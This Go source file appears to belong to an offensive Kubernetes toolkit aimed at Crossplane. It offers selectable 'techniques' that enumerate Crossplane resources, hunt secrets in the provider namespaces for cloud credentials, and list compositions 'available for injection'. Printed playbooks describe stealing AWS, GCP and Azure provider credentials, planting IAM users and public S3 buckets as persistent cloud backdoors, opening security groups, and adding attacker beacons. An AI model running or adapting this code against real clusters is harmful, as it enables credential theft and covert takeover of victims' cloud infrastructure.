package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var crossplaneCompositionGVR = schema.GroupVersionResource{
	Group: "apiextensions.crossplane.io", Version: "v1", Resource: "compositions",
}

var crossplaneXRDGVR = schema.GroupVersionResource{
	Group: "apiextensions.crossplane.io", Version: "v1", Resource: "compositeresourcedefinitions",
}

var crossplaneProviderConfigGVR = schema.GroupVersionResource{
	Group: "pkg.crossplane.io", Version: "v1", Resource: "providers",
}

func detectCrossplane(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"crossplane-system", "upbound-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=crossplane",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "crossplane",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d crossplane pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=crossplane",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "crossplane",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d crossplane pods", len(pods.Items)),
			}}
		}
	}

	return nil
}

// ExploitCrossplane executes the specified Crossplane infrastructure exploitation technique.
func ExploitCrossplane(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return crossplaneEnumerate(ctx, client, dynClient)
	case "provider_creds":
		return crossplaneProviderCreds(ctx, client, dynClient)
	case "composition_inject":
		return crossplaneCompositionInject(ctx, dynClient)
	case "managed_resource":
		return crossplaneManagedResource(ctx, client, dynClient)
	default:
		return crossplaneEnumerate(ctx, client, dynClient)
	}
}

func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Crossplane Infrastructure Enumeration:\n\n")

	found := false

	compositions, err := dynClient.Resource(crossplaneCompositionGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(compositions.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  Compositions (%d):\n", len(compositions.Items))
		for _, comp := range compositions.Items {
			spec, _ := comp.Object["spec"].(map[string]any)
			compositeTypeRef, _ := spec["compositeTypeRef"].(map[string]any)
			apiVersion, _ := compositeTypeRef["apiVersion"].(string)
			kind, _ := compositeTypeRef["kind"].(string)
			fmt.Fprintf(&sb, "    %s → %s/%s\n", comp.GetName(), apiVersion, kind)
		}
		sb.WriteString("\n")
	}

	xrds, err := dynClient.Resource(crossplaneXRDGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(xrds.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  CompositeResourceDefinitions (%d):\n", len(xrds.Items))
		for _, xrd := range xrds.Items {
			spec, _ := xrd.Object["spec"].(map[string]any)
			group, _ := spec["group"].(string)
			fmt.Fprintf(&sb, "    %s (group=%s)\n", xrd.GetName(), group)
		}
		sb.WriteString("\n")
	}

	providers, err := dynClient.Resource(crossplaneProviderConfigGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(providers.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  Providers (%d):\n", len(providers.Items))
		for _, prov := range providers.Items {
			spec, _ := prov.Object["spec"].(map[string]any)
			pkg, _ := spec["package"].(string)
			fmt.Fprintf(&sb, "    %s package=%s\n", prov.GetName(), pkg)
		}
		sb.WriteString("\n")
	}

	namespaces := []string{"crossplane-system", "upbound-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, pod := range pods.Items {
				fmt.Fprintf(&sb, "  Pod: %s/%s (phase=%s)\n", ns, pod.Name, pod.Status.Phase)
			}
		}
	}

	if !found {
		sb.WriteString("  No Crossplane resources detected\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func crossplaneProviderCreds(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Crossplane Provider Credential Theft:\n\n")

	sb.WriteString("  Crossplane providers use ProviderConfig with cloud credentials.\n")
	sb.WriteString("  These credentials have infrastructure-level access (create/delete VMs, DBs, etc).\n\n")

	_ = dynClient

	namespaces := []string{"crossplane-system", "upbound-system"}
	credSecrets := 0
	for _, ns := range namespaces {
		secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "provider") || strings.Contains(s.Name, "cred") || strings.Contains(s.Name, "aws") || strings.Contains(s.Name, "gcp") || strings.Contains(s.Name, "azure") {
				credSecrets++
				fmt.Fprintf(&sb, "  [CRED] %s/%s type=%s keys=%v\n", ns, s.Name, s.Type, secretKeys(s.Data))
			}
		}
	}

	serviceAccounts, _ := client.CoreV1().ServiceAccounts("crossplane-system").List(ctx, metav1.ListOptions{})
	if serviceAccounts != nil {
		for _, sa := range serviceAccounts.Items {
			if strings.Contains(sa.Name, "provider") {
				fmt.Fprintf(&sb, "  ServiceAccount: %s/%s\n", sa.Namespace, sa.Name)
				for _, anno := range []string{"eks.amazonaws.com/role-arn", "iam.gke.io/gcp-service-account"} {
					if val, ok := sa.Annotations[anno]; ok {
						fmt.Fprintf(&sb, "    %s = %s\n", anno, val)
					}
				}
			}
		}
	}

	fmt.Fprintf(&sb, "\n  Provider credential secrets found: %d\n", credSecrets)

	sb.WriteString("\n  Credential exploitation:\n")
	sb.WriteString("    1. Extract provider credentials from crossplane-system secrets\n")
	sb.WriteString("    2. AWS: IAM credentials with ec2/rds/s3/iam permissions\n")
	sb.WriteString("    3. GCP: service account JSON key with project-level access\n")
	sb.WriteString("    4. Azure: service principal with subscription-level rights\n")
	sb.WriteString("    5. Use credentials for direct cloud API access outside K8s\n")
	sb.WriteString("    6. IRSA/Workload Identity: impersonate the provider SA pod\n")

	return &EvasionResult{
		Technique: "provider_creds",
		Success:   credSecrets > 0,
		Output:    sb.String(),
	}, nil
}

func crossplaneCompositionInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Crossplane Composition Injection:\n\n")

	sb.WriteString("  Compositions define what cloud resources are created.\n")
	sb.WriteString("  Injecting resources into a Composition creates persistent cloud backdoors.\n\n")

	compositions, err := dynClient.Resource(crossplaneCompositionGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list Compositions: %v\n", err)
		return &EvasionResult{Technique: "composition_inject", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  Compositions available for injection (%d):\n", len(compositions.Items))
	for _, comp := range compositions.Items {
		spec, _ := comp.Object["spec"].(map[string]any)
		resources, _ := spec["resources"].([]any)
		fmt.Fprintf(&sb, "    %s (%d resources)\n", comp.GetName(), len(resources))

		if len(resources) > 0 {
			for i, res := range resources {
				if i >= 3 {
					fmt.Fprintf(&sb, "      ... and %d more resources\n", len(resources)-3)
					break
				}
				resMap, _ := res.(map[string]any)
				name, _ := resMap["name"].(string)
				base, _ := resMap["base"].(map[string]any)
				apiVersion, _ := base["apiVersion"].(string)
				kind, _ := base["kind"].(string)
				fmt.Fprintf(&sb, "      [%d] %s: %s/%s\n", i, name, apiVersion, kind)
			}
		}
		sb.WriteString("\n")
	}

	sb.WriteString("  Injection strategies:\n")
	sb.WriteString("    1. Add IAM user/role resource to Composition → persistent cloud access\n")
	sb.WriteString("    2. Add S3 bucket with public ACL → data exfiltration endpoint\n")
	sb.WriteString("    3. Modify security group resources → open ingress ports\n")
	sb.WriteString("    4. Add EC2 instance resource → backdoor compute in victim's cloud\n")
	sb.WriteString("    5. Every claim against this Composition creates the backdoor\n")
	sb.WriteString("    6. Inject readiness check that calls attacker endpoint (beacon)\n")

	return &EvasionResult{
		Technique: "composition_inject",
		Success:   len(compositions.Items) > 0,
		Output:    sb.String(),
	}, nil
}

func crossplaneManagedResource(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Crossplane Managed Resource Enumeration:\n\n")

	sb.WriteString("  Managed Resources represent actual cloud infrastructure.\n")
	sb.WriteString("  Modifying them directly changes live cloud resources.\n\n")

	_ = dynClient

	namespaces := []string{"crossplane-system", "upbound-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, pod := range pods.Items {
			if strings.Contains(pod.Name, "provider") {
				fmt.Fprintf(&sb, "  Provider pod: %s/%s\n", ns, pod.Name)
				for _, c := range pod.Spec.Containers {
					fmt.Fprintf(&sb, "    Container: %s image=%s\n", c.Name, c.Image)
				}
			}
		}
	}

	crds, err := client.Discovery().ServerResourcesForGroupVersion("ec2.aws.upbound.io/v1beta1")
	if err == nil && crds != nil {
		sb.WriteString("\n  AWS EC2 managed resources available:\n")
		for _, r := range crds.APIResources {
			fmt.Fprintf(&sb, "    %s\n", r.Kind)
		}
	}

	crds, err = client.Discovery().ServerResourcesForGroupVersion("s3.aws.upbound.io/v1beta1")
	if err == nil && crds != nil {
		sb.WriteString("\n  AWS S3 managed resources available:\n")
		for _, r := range crds.APIResources {
			fmt.Fprintf(&sb, "    %s\n", r.Kind)
		}
	}

	sb.WriteString("\n  Managed resource attack vectors:\n")
	sb.WriteString("    1. Modify SecurityGroup to open ports (immediate cloud effect)\n")
	sb.WriteString("    2. Create new IAM managed resource for attacker access\n")
	sb.WriteString("    3. Modify RDS instance to disable encryption/make public\n")
	sb.WriteString("    4. Add S3 BucketPolicy granting external access\n")
	sb.WriteString("    5. Crossplane reconciles: deletions are recreated automatically\n")
	sb.WriteString("    6. Drift detection delay: changes persist until next reconcile\n")

	return &EvasionResult{
		Technique: "managed_resource",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
